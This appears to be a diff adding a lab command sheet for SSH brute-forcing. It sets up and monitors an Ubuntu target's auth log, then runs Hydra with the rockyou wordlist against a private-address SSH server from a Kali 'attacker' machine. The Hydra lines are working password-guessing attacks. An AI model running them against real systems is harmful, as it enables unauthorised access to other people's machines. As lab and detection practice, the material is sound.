@@ -1,0 +1,34 @@
+# === Ubuntu Server (Target Machine) ===
+
+sudo systemctl status ssh
+sudo apt update
+sudo apt install openssh-server -y
+sudo systemctl enable ssh
+sudo systemctl start ssh
+ip a
+
+## Real-time log monitoring
+sudo tail -f /var/log/auth.log
+
+## Show all failed SSH login attempts
+sudo grep "Failed password" /var/log/auth.log
+
+## Count unique usernames being brute-forced
+sudo grep "Failed password" /var/log/auth.log | awk '{print $(NF-5)}' | sort | uniq -c | sort -nr
+
+## Count IP addresses with most failed attempts
+sudo grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr
+
+## Optional: View successful SSH logins
+sudo grep "Accepted password" /var/log/auth.log
+
+# === Kali Linux (Attacker Machine) ===
+
+sudo apt update
+sudo apt install hydra -y
+
+## Brute-force SSH using Hydra (replace <TARGET-IP> with real IP)
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.12 -t 4 -vV
+
+## Optional: try with another username file
+hydra -L users.txt -P rockyou.txt ssh://10.0.0.12 -t 4 -vV
